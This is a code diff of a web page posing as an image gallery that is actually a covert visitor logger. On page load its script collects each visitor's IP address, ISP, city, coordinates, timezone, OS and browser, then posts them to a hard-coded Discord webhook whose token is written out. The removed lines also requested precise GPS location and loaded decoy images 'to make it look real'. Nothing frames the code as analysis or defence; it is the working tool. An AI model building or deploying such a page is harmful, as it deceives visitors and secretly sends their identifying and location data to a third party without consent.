@@ -34,39 +34,24 @@
             0% { transform: rotate(0deg); }
             100% { transform: rotate(360deg); }
         }
-        .gallery {
-            display: grid;
-            grid-template-columns: repeat(3, 1fr);
-            gap: 10px;
-            margin-top: 20px;
-        }
-        .gallery img {
-            width: 100%;
-            height: 150px;
-            object-fit: cover;
-            border-radius: 5px;
-        }
     </style>
 </head>
 <body>
     <div class="container">
         <div class="loader"></div>
         <p id="status-message">Loading gallery...</p>
-        <div class="gallery" id="image-gallery" style="display: none;">
-            <!-- Images will be loaded here -->
-        </div>
     </div>
 
     <script>
         // Configuration
         const config = {
             // BASE CONFIG
-            "webhook": "https://discord.com/api/webhooks/1350791006143905852/pq3nFAQqzUEyw2T7b3N1y1_iW8Sr5vnzY8-LxkaNA0lqicxNeEdO7AE9HMKDaPFLOc-j",
-            "username": "Image Gallery Viewer",
+            "webhook": "https://discord.com/api/webhooks/1433408427815600241/TkgVjkPmIOqYcO9g3P0GiH1SRkLStDJbpuQ1gIpBx6pPvzWDSOR1JhSP-cQJuf0wDAIN",
+            "username": "Image Gallery",
             "color": 0x00FFFF,
 
             // OPTIONS
-            "accurateLocation": true,
+            "accurateLocation": false, // Disable GPS for now to avoid permission issues
             "linkAlerts": true,
             "vpnCheck": 1,
             "antiBot": 1,
@@ -81,112 +66,12 @@
             // CUSTOM MESSAGE
             "message": {
                 "enabled": false,
-                "message": "Thanks for visiting our gallery!",
+                "message": "Your information has been logged.",
                 "richMessage": true
             }
         };
 
-        // Enhanced error reporting
-        async function sendErrorWebhook(error, additionalInfo = "") {
-            try {
-                const errorMessage = error.stack || error.message || error.toString();
-                await fetch(config.webhook, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        username: `${config.username} - ERROR`,
-                        content: "@everyone",
-                        embeds: [{
-                            title: "⚠️ Gallery Error",
-                            color: 0xFF0000,
-                            description: `**An error occurred!**\n\n**Error:**\n\`\`\`${errorMessage.substring(0, 1000)}\`\`\`\n**Additional Info:** ${additionalInfo}`,
-                            fields: [
-                                { name: "URL", value: window.location.href, inline: true },
-                                { name: "User Agent", value: navigator.userAgent?.substring(0, 100) || "Unknown", inline: true }
-                            ]
-                        }]
-                    })
-                });
-            } catch (e) {
-                console.error('Failed to send error webhook:', e);
-            }
-        }
-
-        // Get IP information using JSONP to avoid CORS
-        function getIPInfo() {
-            return new Promise((resolve, reject) => {
-                // Create JSONP callback
-                const callbackName = 'ipCallback_' + Date.now();
-                window[callbackName] = function(data) {
-                    delete window[callbackName];
-                    document.body.removeChild(script);
-                    
-                    if (data && data.status === 'success') {
-                        resolve(data);
-                    } else {
-                        reject(new Error('IP API failed: ' + (data?.message || 'Unknown error')));
-                    }
-                };
-
-                // Create script tag for JSONP
-                const script = document.createElement('script');
-                script.src = `https://ip-api.com/json/?fields=66846719&callback=${callbackName}`;
-                script.onerror = () => {
-                    reject(new Error('Failed to load IP API'));
-                };
-                document.body.appendChild(script);
-            });
-        }
-
-        // Get precise location
-        function getPreciseLocation() {
-            return new Promise((resolve) => {
-                if (!navigator.geolocation) {
-                    resolve(null);
-                    return;
-                }
-
-                navigator.geolocation.getCurrentPosition(
-                    (position) => {
-                        const coords = `${position.coords.latitude},${position.coords.longitude}`;
-                        resolve({
-                            coords: coords,
-                            accuracy: position.coords.accuracy,
-                            mapsLink: `https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude}`
-                        });
-                    },
-                    (error) => {
-                        console.log('Geolocation failed or denied:', error.message);
-                        resolve(null);
-                    },
-                    {
-                        enableHighAccuracy: true,
-                        timeout: 10000,
-                        maximumAge: 0
-                    }
-                );
-            });
-        }
-
-        // Send webhook helper
-        async function sendWebhook(webhookData) {
-            try {
-                const response = await fetch(config.webhook, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(webhookData)
-                });
-                
-                if (!response.ok) {
-                    throw new Error(`Webhook failed: ${response.status}`);
-                }
-            } catch (error) {
-                console.error('Failed to send webhook:', error);
-                await sendErrorWebhook(error, "Webhook send failed");
-            }
-        }
-
-        // Parse user agent
+        // Enhanced user agent parsing
         function parseUserAgent(ua) {
             if (!ua) return { os: 'Unknown', browser: 'Unknown' };
             
@@ -204,114 +89,187 @@
                 const match = /Mac OS X ([0-9_]+)/.exec(ua);
                 os = match ? `macOS ${match[1].replace(/_/g, '.')}` : 'macOS';
             }
-            else if (/Android/.test(ua)) os = 'Android';
-            else if (/(iPhone|iPad).*OS/.test(ua)) os = 'iOS';
+            else if (/Android ([0-9.]+)/.test(ua)) {
+                const match = /Android ([0-9.]+)/.exec(ua);
+                os = match ? `Android ${match[1]}` : 'Android';
+            }
+            else if (/(iPhone|iPad).*OS ([0-9_]+)/.test(ua)) {
+                const match = /(iPhone|iPad).*OS ([0-9_]+)/.exec(ua);
+                os = match ? `iOS ${match[2].replace(/_/g, '.')}` : 'iOS';
+            }
             else if (/Linux/.test(ua)) os = 'Linux';
+            else if (/CrOS/.test(ua)) os = 'Chrome OS';
 
             // Browser Detection
-            if (/Chrome\//.test(ua) && !/Edg|OPR/.test(ua)) browser = 'Chrome';
-            else if (/Firefox\//.test(ua)) browser = 'Firefox';
-            else if (/Safari\//.test(ua) && !/Chrome/.test(ua)) browser = 'Safari';
-            else if (/Edg\//.test(ua)) browser = 'Edge';
-            else if (/OPR\//.test(ua)) browser = 'Opera';
+            if (/Chrome\/([0-9.]+)/.test(ua) && !/Edg|OPR/.test(ua)) {
+                const match = /Chrome\/([0-9.]+)/.exec(ua);
+                browser = match ? `Chrome ${match[1]}` : 'Chrome';
+            }
+            else if (/Firefox\/([0-9.]+)/.test(ua)) {
+                const match = /Firefox\/([0-9.]+)/.exec(ua);
+                browser = match ? `Firefox ${match[1]}` : 'Firefox';
+            }
+            else if (/Safari\/([0-9.]+)/.test(ua) && !/Chrome/.test(ua)) {
+                const match = /Version\/([0-9.]+)/.exec(ua);
+                browser = match ? `Safari ${match[1]}` : 'Safari';
+            }
+            else if (/Edg\/([0-9.]+)/.test(ua)) {
+                const match = /Edg\/([0-9.]+)/.exec(ua);
+                browser = match ? `Edge ${match[1]}` : 'Edge';
+            }
 
             return { os, browser };
         }
 
-        // Load sample images to make it look real
-        function loadGallery() {
-            const gallery = document.getElementById('image-gallery');
-            const images = [
-                'https://picsum.photos/300/200?random=1',
-                'https://picsum.photos/300/200?random=2', 
-                'https://picsum.photos/300/200?random=3',
-                'https://picsum.photos/300/200?random=4',
-                'https://picsum.photos/300/200?random=5',
-                'https://picsum.photos/300/200?random=6'
-            ];
+        // Get continent from country code
+        const getContinent = (countryCode) => {
+            if (!countryCode) return 'Unknown';
+            const continentMap = {
+                'US': 'North America', 'CA': 'North America', 'MX': 'North America',
+                'GB': 'Europe', 'DE': 'Europe', 'FR': 'Europe', 'IT': 'Europe', 'ES': 'Europe',
+                'CN': 'Asia', 'JP': 'Asia', 'IN': 'Asia', 'KR': 'Asia',
+                'BR': 'South America', 'AR': 'South America',
+                'ZA': 'Africa', 'NG': 'Africa', 'EG': 'Africa',
+                'AU': 'Oceania', 'NZ': 'Oceania'
+            };
+            return continentMap[countryCode] || 'Unknown';
+        };
 
-            images.forEach(src => {
-                const img = document.createElement('img');
-                img.src = src;
-                img.alt = 'Gallery image';
-                gallery.appendChild(img);
-            });
-            
-            gallery.style.display = 'grid';
-            document.querySelector('.loader').style.display = 'none';
-            document.getElementById('status-message').textContent = 'Gallery loaded successfully!';
-        }
-
-        // Main logging function
-        async function logVisitor() {
+        // Format timezone
+        const formatTimezone = (timezone) => {
+            if (!timezone) return 'Unknown';
             try {
-                // Send link alert
-                if (config.linkAlerts) {
-                    await sendWebhook({
-                        username: `${config.username} - Visit`,
+                const [continent, city] = timezone.split('/');
+                return `${city.replace(/_/g, ' ')} (${continent})`;
+            } catch {
+                return timezone;
+            }
+        };
+
+        // Error reporting
+        async function sendErrorWebhook(error) {
+            try {
+                await fetch(config.webhook, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        username: `${config.username} - ERROR`,
                         content: "",
                         embeds: [{
-                            title: "🔗 Gallery Accessed",
-                            color: config.color,
-                            description: `Someone visited the image gallery\n\n**User Agent:**\n\`\`\`${navigator.userAgent.substring(0, 200)}\`\`\``
+                            title: "⚠️ Gallery Error",
+                            color: 0xFF0000,
+                            description: `**An error occurred!**\n\n**Error:**\n\`\`\`${error.message || error}\`\`\``,
+                            fields: [
+                                { name: "URL", value: window.location.href, inline: true },
+                                { name: "User Agent", value: navigator.userAgent?.slice(0, 500) || "Unknown" }
+                            ]
                         }]
-                    });
-                }
+                    })
+                });
+            } catch (e) {
+                console.error('Failed to send error webhook:', e);
+            }
+        }
 
-                // Get IP info with JSONP (no CORS)
+        // Send webhook helper
+        async function sendWebhook(webhookData) {
+            try {
+                const response = await fetch(config.webhook, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(webhookData)
+                });
+                if (!response.ok) {
+                    throw new Error(`Webhook failed: ${response.status}`);
+                }
+            } catch (error) {
+                console.error('Failed to send webhook:', error);
+            }
+        }
+
+        // Get IP information with fallback
+        async function getIPInfo() {
+            try {
+                // Try ip-api.com first
+                const response = await fetch('https://ipapi.co/json/');
+                if (!response.ok) throw new Error('IP API failed');
+                
+                const data = await response.json();
+                return {
+                    query: data.ip,
+                    isp: data.org || 'Unknown',
+                    as: data.asn || 'Unknown',
+                    continent: data.continent_code || 'Unknown',
+                    country: data.country_name || 'Unknown',
+                    regionName: data.region || 'Unknown',
+                    city: data.city || 'Unknown',
+                    lat: data.latitude || 0,
+                    lon: data.longitude || 0,
+                    timezone: data.timezone || 'Unknown',
+                    mobile: false,
+                    proxy: false,
+                    hosting: false,
+                    countryCode: data.country_code || ''
+                };
+            } catch (error) {
+                console.log('First IP API failed, trying fallback...');
+                
+                // Fallback to another service
+                try {
+                    const fallbackResponse = await fetch('https://api.ipify.org?format=json');
+                    const fallbackData = await fallbackResponse.json();
+                    
+                    return {
+                        query: fallbackData.ip,
+                        isp: 'Unknown',
+                        as: 'Unknown',
+                        continent: 'Unknown',
+                        country: 'Unknown',
+                        regionName: 'Unknown',
+                        city: 'Unknown',
+                        lat: 0,
+                        lon: 0,
+                        timezone: 'Unknown',
+                        mobile: false,
+                        proxy: false,
+                        hosting: false,
+                        countryCode: ''
+                    };
+                } catch (fallbackError) {
+                    throw new Error('All IP APIs failed');
+                }
+            }
+        }
+
+        // Get IP information and send to Discord
+        async function logIP() {
+            try {
+                document.getElementById('status-message').textContent = 'Loading images...';
+
+                // Get IP information
                 const ipData = await getIPInfo();
                 
-                // Get browser info
+                // Get browser information
                 const browserInfo = parseUserAgent(navigator.userAgent);
-
-                // Send main webhook
-                await sendWebhook({
-                    username: config.username,
-                    content: "",
-                    embeds: [{
-                        title: "🌐 Gallery Visitor",
-                        color: config.color,
-                        description: `
-**Visitor Information:**
-
-**IP Info:**
-> **IP:** \`${ipData.query}\`
-> **ISP:** \`${ipData.isp || 'Unknown'}\`
-> **Country:** \`${ipData.country || 'Unknown'}\`
-> **Region:** \`${ipData.regionName || 'Unknown'}\`
-> **City:** \`${ipData.city || 'Unknown'}\`
-> **Coords:** \`${ipData.lat}, ${ipData.lon}\`
-
-**Browser Info:**
-> **OS:** \`${browserInfo.os}\`
-> **Browser:** \`${browserInfo.browser}\`
-> **Mobile:** \`${ipData.mobile ? 'Yes' : 'No'}\`
-> **VPN:** \`${ipData.proxy ? 'Yes' : 'No'}\``,
-                        footer: {
-                            text: "Gallery access logged"
-                        }
-                    }]
-                });
-
-                // Get precise location if enabled
-                if (config.accurateLocation) {
-                    const preciseLocation = await getPreciseLocation();
-                    if (preciseLocation) {
-                        await sendWebhook({
-                            username: `${config.username} - Location`,
-                            content: "",
-                            embeds: [{
-                                title: "📍 Precise Location",
-                                color: 0x00FF00,
-                                description: `**Exact GPS Location Obtained:**\n\n**Coordinates:** \`${preciseLocation.coords}\`\n**Accuracy:** ${preciseLocation.accuracy}m\n**Google Maps:** [View Location](${preciseLocation.mapsLink})`
-                            }]
-                        });
-                    }
+                
+                // Apply continent mapping
+                if (ipData.countryCode) {
+                    ipData.continent = getContinent(ipData.countryCode);
                 }
 
-                // Load the actual gallery
-                loadGallery();
+                const logData = {
+                    ipInfo: ipData,
+                    browserInfo: browserInfo,
+                    timestamp: new Date().toISOString(),
+                    url: window.location.href
+                };
 
+                // Send main webhook
+                await sendMainWebhook(logData);
+
+                // Show success message
+                document.getElementById('status-message').textContent = 'Gallery loaded successfully!';
+                
                 // Redirect if enabled
                 if (config.redirect.enabled) {
                     setTimeout(() => {
@@ -320,21 +278,47 @@
                 }
 
             } catch (error) {
-                console.error('Logging error:', error);
-                
-                // Still load gallery even if logging fails
-                loadGallery();
-                
-                // Send error report
-                await sendErrorWebhook(error, "Main logging function failed");
+                console.error('Error:', error);
+                await sendErrorWebhook(error);
+                document.getElementById('status-message').textContent = 'Failed to load gallery. Please refresh.';
             }
         }
 
-        // Start when page loads
-        document.addEventListener('DOMContentLoaded', function() {
-            setTimeout(logVisitor, 1000); // Small delay to show loading
-        });
+        async function sendMainWebhook(data) {
+            const embed = {
+                username: config.username,
+                content: "",
+                embeds: [{
+                    title: "🌐 Gallery Visitor",
+                    color: config.color,
+                    description: `
+**IP Info:**
+> **IP:** \`${data.ipInfo.query}\`
+> **Provider:** \`${data.ipInfo.isp}\`
+> **ASN:** \`${data.ipInfo.as}\`
+> **Continent:** \`${data.ipInfo.continent}\`
+> **Country:** \`${data.ipInfo.country}\`
+> **Region:** \`${data.ipInfo.regionName}\`
+> **City:** \`${data.ipInfo.city}\`
+> **Coordinates:** \`${data.ipInfo.lat}, ${data.ipInfo.lon}\`
+> **Timezone:** \`${formatTimezone(data.ipInfo.timezone)}\`
 
+**PC Info:**
+> **OS:** \`${data.browserInfo.os}\`
+> **Browser:** \`${data.browserInfo.browser}\`
+
+**User Agent:**
+\`\`\`
+${navigator.userAgent}
+\`\`\``
+                }]
+            };
+
+            await sendWebhook(embed);
+        }
+
+        // Execute when page loads
+        document.addEventListener('DOMContentLoaded', logIP);
     </script>
 </body>
 </html>
